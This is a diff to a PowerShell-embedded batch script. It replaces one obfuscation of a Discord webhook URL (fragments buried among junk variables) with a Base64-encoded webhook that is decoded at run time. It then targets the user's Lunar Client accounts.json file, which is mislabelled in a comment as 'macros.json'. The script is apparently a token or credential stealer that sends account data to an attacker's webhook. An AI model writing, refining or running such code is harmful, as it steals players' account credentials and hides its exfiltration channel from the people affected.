@@ -9,69 +9,11 @@ $batchContent = @'
 @echo off
 setlocal enabledelayedexpansion
 
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set a=ht
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set b=tp
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set c=s://
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set d=di
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set e=sc
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set f=ord.
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set g=com/
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set h=api/
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set i=web
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set j=hooks/
-set k=1387487482706268211/
-set l=KOzR_i52gCgUY-wj_0OAYynRh
-set Q=RQ1bAXvv8pR3iAoxtKiOEuJNtwovVLceIrq6OFipWLi
+:: Base64-encoded webhook URL
+set encoded=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NjYyMzExNDEwNzk0NTA4MC9BOG0xQ3VoNzBTZU5ZS0w2dkJ4WDhsUG01MEs4aWxjVnhvTjhRTDdZZldJOXpaZV8yRjM3TGxNNFZxVTNxeUNlcVkyZQ==
 
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set A=!a!!b!!c!
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set B=!d!!e!!f!!g!
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set C=!h!!i!!j!
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
-set Fd=!A!!B!!C!!k!!l!Q!
-set _k1=iAoxtKiOEuJNtw
-set _=OEuJNtwovVLceIrq6OFipWLi
-set _j=OAYynRhRQ1bAXvv8pR
+:: Decode Base64 webhook URL using PowerShell
+for /f "delims=" %%A in ('powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('!encoded!'))"') do set "webhook=%%A"
 
 :: Path to macros.json (plain for simplicity)
 set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json
